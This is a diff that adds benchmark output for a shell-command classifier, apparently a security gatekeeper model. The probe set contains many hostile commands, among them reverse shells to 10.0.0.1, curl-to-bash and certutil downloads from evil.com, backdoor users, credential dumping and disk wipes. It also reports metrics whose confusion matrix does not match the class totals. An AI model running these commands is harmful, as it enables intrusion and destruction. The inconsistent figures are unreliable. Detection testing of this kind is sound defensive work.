@@ -1,0 +1,163 @@
+Warning: You are sending unauthenticated requests to the HF Hub. Please set a HF_TOKEN to enable higher rate limits and faster downloads.
+[*] Initializing Genos engine...
+Loading weights:   0%|          | 0/199 [00:00<?, ?it/s]Loading weights: 100%|██████████| 199/199 [00:00<00:00, 17434.65it/s]
+Loading weights:   0%|          | 0/199 [00:00<?, ?it/s]Loading weights: 100%|██████████| 199/199 [00:00<00:00, 14949.61it/s]
+
+====================================================================================================
+  PROBE SET — 3-Class Gatekeeper Benchmark
+====================================================================================================
+   # │           Expected │                Got │  Conf │   OK │       ms │ Command
+──────────────────────────────────────────────────────────────────────────────────
+   1 │             Benign │             Benign │  94.3 │    ✓ │    251ms │ ls -la /var/log
+   2 │             Benign │             Benign │  93.4 │    ✓ │     14ms │ df -h
+   3 │             Benign │          Malicious │  68.4 │    ✗ │     33ms │ uptime
+   4 │             Benign │             Benign │  90.8 │    ✓ │     14ms │ whoami
+   5 │             Benign │          Malicious │  59.9 │    ✗ │     25ms │ pwd
+   6 │             Benign │             Benign │  78.3 │    ✓ │     13ms │ echo "hello world"
+   7 │             Benign │             Benign │  92.8 │    ✓ │     13ms │ date +%Y-%m-%d
+   8 │             Benign │         Suspicious │  98.3 │    ✗ │     27ms │ ps aux --sort=-%mem | head -10
+   9 │             Benign │             Benign │  79.8 │    ✓ │     13ms │ free -m
+  10 │             Benign │          Malicious │  48.8 │    ✗ │     25ms │ id
+  11 │             Benign │         Suspicious │  90.6 │    ✗ │     26ms │ du -sh /tmp
+  12 │             Benign │             Benign │  94.1 │    ✓ │     13ms │ ls -lR /home
+  13 │             Benign │         Suspicious │  98.2 │    ✗ │     27ms │ cat /proc/cpuinfo | head -20
+  14 │             Benign │         Suspicious │  54.5 │    ✗ │     27ms │ top -bn1 | head -5
+  15 │             Benign │             Benign │  90.1 │    ✓ │     14ms │ ping -c 3 8.8.8.8
+  16 │             Benign │         Suspicious │  97.8 │    ✗ │     27ms │ dig google.com
+  17 │             Benign │         Suspicious │  94.0 │    ✗ │     27ms │ grep -r "error" /var/log/syslog | tail -20
+  18 │             Benign │             Benign │  93.7 │    ✓ │     13ms │ find /tmp -type f -mtime -1
+  19 │             Benign │             Benign │  95.3 │    ✓ │     14ms │ systemctl status nginx
+  20 │             Benign │             Benign │  78.2 │    ✓ │     14ms │ journalctl -u sshd --no-pager -n 20
+  21 │             Benign │         Suspicious │  98.7 │    ✗ │     27ms │ mount | grep ext4
+  22 │             Benign │         Suspicious │  98.0 │    ✗ │     27ms │ lsblk
+  23 │             Benign │         Suspicious │  98.7 │    ✗ │     27ms │ history | tail -10
+  24 │             Benign │         Suspicious │  95.0 │    ✗ │     27ms │ file /bin/ls
+  25 │             Benign │         Suspicious │  98.3 │    ✗ │     27ms │ head -5 /etc/group
+  26 │             Benign │             Benign │  95.2 │    ✓ │     13ms │ ls /usr/bin | wc -l
+  27 │             Benign │         Suspicious │  98.1 │    ✗ │     27ms │ dpkg -l | grep python
+  28 │             Benign │         Suspicious │  98.2 │    ✗ │     27ms │ pip list 2>/dev/null | head -10
+  29 │             Benign │             Benign │  96.3 │    ✓ │     13ms │ git log --oneline -5
+  30 │             Benign │         Suspicious │  75.4 │    ✗ │     27ms │ docker ps
+  31 │             Benign │         Suspicious │  98.4 │    ✗ │     27ms │ kubectl get pods 2>/dev/null
+  32 │             Benign │         Suspicious │  95.3 │    ✗ │     27ms │ ss -tuln
+  33 │             Benign │         Suspicious │  97.8 │    ✗ │     27ms │ route -n
+  34 │             Benign │         Suspicious │  97.9 │    ✗ │     27ms │ crontab -l
+  35 │             Benign │         Suspicious │  67.1 │    ✗ │     27ms │ tar tzf backup.tar.gz 2>/dev/null | head -5
+  36 │             Benign │          Malicious │  83.2 │    ✗ │     27ms │ md5sum /etc/passwd
+  37 │             Benign │             Benign │  86.8 │    ✓ │     13ms │ chmod 644 myfile.txt
+  38 │             Benign │             Benign │  57.6 │    ✓ │     13ms │ cp /tmp/report.csv /home/user/reports/
+  39 │  Context_Dependent │         Suspicious │  98.0 │    ✗ │     27ms │ cat /etc/hostname
+  40 │  Context_Dependent │         Suspicious │  62.6 │    ✗ │     27ms │ hostname
+  41 │  Context_Dependent │             Benign │  96.1 │    ✗ │     13ms │ uname -a
+  42 │  Context_Dependent │         Suspicious │  97.9 │    ✗ │     27ms │ ip addr show
+  43 │  Context_Dependent │          Malicious │  51.8 │    ✗ │     27ms │ wc -l /etc/passwd
+  44 │  Context_Dependent │         Suspicious │  56.2 │    ✗ │     27ms │ tail -n 50 /var/log/auth.log
+  45 │  Context_Dependent │         Suspicious │  98.1 │    ✗ │     27ms │ cat /etc/os-release
+  46 │  Context_Dependent │         Suspicious │  98.2 │    ✗ │     27ms │ env | grep PATH
+  47 │  Context_Dependent │          Malicious │  49.9 │    ✗ │     27ms │ alias
+  48 │  Context_Dependent │         Suspicious │  78.0 │    ✗ │     27ms │ stat /etc/passwd
+  49 │  Context_Dependent │         Suspicious │  98.4 │    ✗ │     27ms │ netstat -rn
+  50 │  Context_Dependent │         Suspicious │  97.6 │    ✗ │     27ms │ arp -a
+  51 │  Context_Dependent │         Suspicious │  97.1 │    ✗ │     27ms │ curl -s https://ifconfig.me
+  52 │  Context_Dependent │          Malicious │  64.6 │    ✗ │     27ms │ rm -rf / --no-preserve-root
+  53 │  Context_Dependent │          Malicious │  75.1 │    ✗ │     27ms │ :(){ :|:& };:
+  54 │  Context_Dependent │          Malicious │  92.5 │    ✗ │     27ms │ dd if=/dev/zero of=/dev/sda bs=1M
+  55 │  Context_Dependent │             Benign │  50.2 │    ✗ │     27ms │ mkfs.ext4 /dev/sda1
+  56 │  Context_Dependent │         Suspicious │  98.4 │    ✗ │     27ms │ nmap -sS -p- 192.168.1.0/24
+  57 │  Context_Dependent │         Suspicious │  98.6 │    ✗ │     27ms │ nmap -sV --script=vuln 10.0.0.5
+  58 │  Context_Dependent │         Suspicious │  98.8 │    ✗ │     27ms │ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5
+  59 │  Context_Dependent │         Suspicious │  98.2 │    ✗ │     27ms │ sqlmap -u "http://target.com/page?id=1" --dbs
+  60 │  Context_Dependent │         Suspicious │  96.5 │    ✗ │     27ms │ nikto -h http://target.com
+  61 │  Context_Dependent │          Malicious │  96.1 │    ✗ │     27ms │ msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/m…
+  62 │  Context_Dependent │          Malicious │  94.1 │    ✗ │     27ms │ john /tmp/crackme --wordlist=/usr/share/wordlists/rockyou.txt
+  63 │  Context_Dependent │          Malicious │  91.0 │    ✗ │     27ms │ iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD AC…
+  64 │  Context_Dependent │         Suspicious │  98.5 │    ✗ │     27ms │ find / -perm -4000 -type f 2>/dev/null
+  65 │  Context_Dependent │          Malicious │  90.7 │    ✗ │     27ms │ ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//
+  66 │  Context_Dependent │          Malicious │  56.8 │    ✗ │     27ms │ arpspoof -i eth0 -t 10.0.0.1 10.0.0.254
+  67 │  Context_Dependent │          Malicious │  48.8 │    ✗ │     27ms │ responder -I eth0 -wrf
+  68 │  Context_Dependent │         Suspicious │  96.5 │    ✗ │     27ms │ python3 -c "import pty; pty.spawn('/bin/bash')"
+  69 │  Context_Dependent │          Malicious │  96.4 │    ✗ │     27ms │ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec spri…
+  70 │  Context_Dependent │          Malicious │  97.7 │    ✗ │     27ms │ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:…
+  71 │  Context_Dependent │          Malicious │  97.2 │    ✗ │     27ms │ openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | open…
+  72 │  Context_Dependent │          Malicious │  96.9 │    ✗ │     27ms │ base64 -d <<< "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" …
+  73 │  Context_Dependent │          Malicious │  96.9 │    ✗ │     27ms │ xterm -display 10.0.0.1:1 -e /bin/bash
+  74 │  Context_Dependent │         Suspicious │  98.8 │    ✗ │     27ms │ chisel client 10.0.0.1:8080 R:1080:socks
+  75 │  Context_Dependent │         Suspicious │  98.7 │    ✗ │     27ms │ ssh -D 1080 -fNq user@10.0.0.1
+  76 │  Context_Dependent │         Suspicious │  96.4 │    ✗ │     27ms │ tcpdump -i eth0 -w /tmp/capture.pcap
+  77 │          Malicious │          Malicious │  96.3 │    ✓ │     27ms │ curl http://evil.com/shell.sh | bash
+  78 │          Malicious │          Malicious │  97.4 │    ✓ │     27ms │ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+  79 │          Malicious │          Malicious │  96.3 │    ✓ │     27ms │ python3 -c "import socket,subprocess,os;s=socket.socket();s.conne…
+  80 │          Malicious │          Malicious │  97.3 │    ✓ │     27ms │ nc -e /bin/sh 10.0.0.1 4444
+  81 │          Malicious │          Malicious │  95.0 │    ✓ │     27ms │ echo "* * * * * curl http://evil.com/mine | bash" | crontab -
+  82 │          Malicious │          Malicious │  97.0 │    ✓ │     27ms │ wget -q http://malware.site/payload -O /tmp/.hidden && chmod +x /…
+  83 │          Malicious │         Suspicious │  97.3 │    ✗ │     27ms │ cat /etc/shadow
+  84 │          Malicious │          Malicious │  96.1 │    ✓ │     27ms │ unshadow /etc/passwd /etc/shadow > /tmp/crackme
+  85 │          Malicious │          Malicious │  95.3 │    ✓ │     38ms │ powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+  86 │          Malicious │          Malicious │  94.7 │    ✓ │     27ms │ chmod u+s /bin/bash
+  87 │          Malicious │          Malicious │  97.0 │    ✓ │     27ms │ cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor
+  88 │          Malicious │          Malicious │  96.9 │    ✓ │     27ms │ echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+  89 │          Malicious │          Malicious │  95.9 │    ✓ │     27ms │ useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
+  90 │          Malicious │          Malicious │  94.8 │    ✓ │     27ms │ ssh-keygen -t rsa -N "" -f /tmp/key && cat /tmp/key.pub >> /root/…
+  91 │          Malicious │          Malicious │  97.0 │    ✓ │     27ms │ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+  92 │          Malicious │          Malicious │  97.5 │    ✓ │     27ms │ certutil -urlcache -split -f http://evil.com/payload.exe C:\Windo…
+  93 │          Malicious │          Malicious │  98.2 │    ✓ │     27ms │ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Upd…
+  94 │          Malicious │          Malicious │  97.1 │    ✓ │     27ms │ schtasks /create /tn "Updater" /tr "powershell -ep bypass -f C:\p…
+  95 │          Malicious │          Malicious │  95.3 │    ✓ │     27ms │ wmic process call create "cmd /c powershell -ep bypass -f C:\payl…
+  96 │          Malicious │          Malicious │  97.6 │    ✓ │     27ms │ bitsadmin /transfer job /download /priority high http://evil.com/…
+  97 │          Malicious │          Malicious │  96.6 │    ✓ │     27ms │ perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_S…
+  98 │          Malicious │          Malicious │  97.5 │    ✓ │     26ms │ php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3…
+  99 │          Malicious │          Malicious │  97.1 │    ✓ │     39ms │ eval $(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5zaCB8IGJhc2g=…
+ 100 │          Malicious │          Malicious │  79.1 │    ✓ │     26ms │ linpeas.sh
+ 101 │          Malicious │          Malicious │  97.5 │    ✓ │     27ms │ ./pspy64
+
+  Accuracy: 39/101 (38.6%)
+  Macro F1: 0.4137
+  Avg latency: 27.3ms  |  p50: 26.7ms  |  p95: 27.0ms
+
+  Class                    Prec      Rec       F1  Support
+  ────────────────────────────────────────────────────────
+  Benign                 0.8824   0.3947   0.5455       38
+  Malicious              0.5455   0.9600   0.6957       25
+  Context_Dependent      0.0000   0.0000   0.0000       38
+
+  Confusion Matrix (rows=true, cols=predicted):
+                         BEN   MAL   CTX
+  BEN                     15     4     0
+  MAL                      0    24     0
+  CTX                      2    16     0
+
+  Routing distribution:
+    Benign               →  16.8%
+    Malicious            →  43.6%
+    Context_Dependent    →   0.0%
+
+  Misclassifications (62):
+    #3   expected=Benign             got=Malicious          conf= 68.4  cmd=uptime
+    #5   expected=Benign             got=Malicious          conf= 59.9  cmd=pwd
+    #8   expected=Benign             got=Suspicious         conf= 98.3  cmd=ps aux --sort=-%mem | head -10
+    #10  expected=Benign             got=Malicious          conf= 48.8  cmd=id
+    #11  expected=Benign             got=Suspicious         conf= 90.6  cmd=du -sh /tmp
+    #13  expected=Benign             got=Suspicious         conf= 98.2  cmd=cat /proc/cpuinfo | head -20
+    #14  expected=Benign             got=Suspicious         conf= 54.5  cmd=top -bn1 | head -5
+    #16  expected=Benign             got=Suspicious         conf= 97.8  cmd=dig google.com
+    #17  expected=Benign             got=Suspicious         conf= 94.0  cmd=grep -r "error" /var/log/syslog | tail -20
+    #21  expected=Benign             got=Suspicious         conf= 98.7  cmd=mount | grep ext4
+    #22  expected=Benign             got=Suspicious         conf= 98.0  cmd=lsblk
+    #23  expected=Benign             got=Suspicious         conf= 98.7  cmd=history | tail -10
+    #24  expected=Benign             got=Suspicious         conf= 95.0  cmd=file /bin/ls
+    #25  expected=Benign             got=Suspicious         conf= 98.3  cmd=head -5 /etc/group
+    #27  expected=Benign             got=Suspicious         conf= 98.1  cmd=dpkg -l | grep python
+    #28  expected=Benign             got=Suspicious         conf= 98.2  cmd=pip list 2>/dev/null | head -10
+    #30  expected=Benign             got=Suspicious         conf= 75.4  cmd=docker ps
+    #31  expected=Benign             got=Suspicious         conf= 98.4  cmd=kubectl get pods 2>/dev/null
+    #32  expected=Benign             got=Suspicious         conf= 95.3  cmd=ss -tuln
+    #33  expected=Benign             got=Suspicious         conf= 97.8  cmd=route -n
+    #34  expected=Benign             got=Suspicious         conf= 97.9  cmd=crontab -l
+    #35  expected=Benign             got=Suspicious         conf= 67.1  cmd=tar tzf backup.tar.gz 2>/dev/null | head -5
+    #36  expected=Benign             got=Malicious          conf= 83.2  cmd=md5sum /etc/passwd
+    #39  expected=Context_Dependent  got=Suspicious         conf= 98.0  cmd=cat /etc/hostname
+    #40  expected=Context_Dependent  got=Suspicious         conf= 62.6  cmd=hostname
+    #41  expected=Context_Dependent  got=Benign             conf= 96.1  cmd=uname -a
+    #42  expected=Context_Dependent  got=Suspicious         conf= 97.9  cmd=ip addr show
+    #43  expected=Context_Dependent  got=Malicious          conf= 51.8  cmd=wc -l /etc/passwd
+    #44  expected=Context_Dependent  got=Suspicious         conf= 56.2  cmd=tail -n 50 /var/log/auth.log
